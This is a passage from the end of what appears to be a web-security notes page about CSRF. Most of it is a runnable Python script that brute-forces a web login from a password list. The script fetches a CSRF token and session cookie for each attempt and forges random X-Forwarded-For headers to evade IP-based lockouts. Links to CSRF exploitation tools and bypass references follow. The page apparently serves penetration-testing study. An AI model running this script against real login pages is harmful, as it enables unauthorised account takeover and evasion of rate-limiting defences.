<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">csrf</span><span class="p">,</span> <span class="n">cookie</span> <span class="o">=</span> <span class="nf">init_session</span><span class="p">()</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="n">SESSION_COOKIE_NAME</span><span class="p">:</span> <span class="n">cookie</span><span class="p">}</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">tokenCSRF</span><span class="sh">"</span><span class="p">:</span> <span class="n">csrf</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">save</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span>
    <span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">X-Forwarded-For</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">)</span>
    <span class="k">if</span> <span class="sh">"</span><span class="s">Username or password incorrect</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">FOUND </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">True</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">PASS_LIST</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="nf">login</span><span class="p">(</span><span class="n">USER</span><span class="p">,</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">())</span>
</code></pre></div></div> <h2 id="tools-">Tools <a href="#tools" id="tools"></a> </h2> <ul> <li><a href="https://github.com/0xInfection/XSRFProbe" rel="external nofollow noopener" target="_blank">https://github.com/0xInfection/XSRFProbe</a></li> <li><a href="https://github.com/merttasci/csrf-poc-generator" rel="external nofollow noopener" target="_blank">https://github.com/merttasci/csrf-poc-generator</a></li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://portswigger.net/web-security/csrf" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/csrf</a></li> <li><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/csrf/bypassing-token-validation</a></li> <li><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses</a></li> <li><a href="https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html" rel="external nofollow noopener" target="_blank">https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html</a></li> </ul> <p>​</p> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>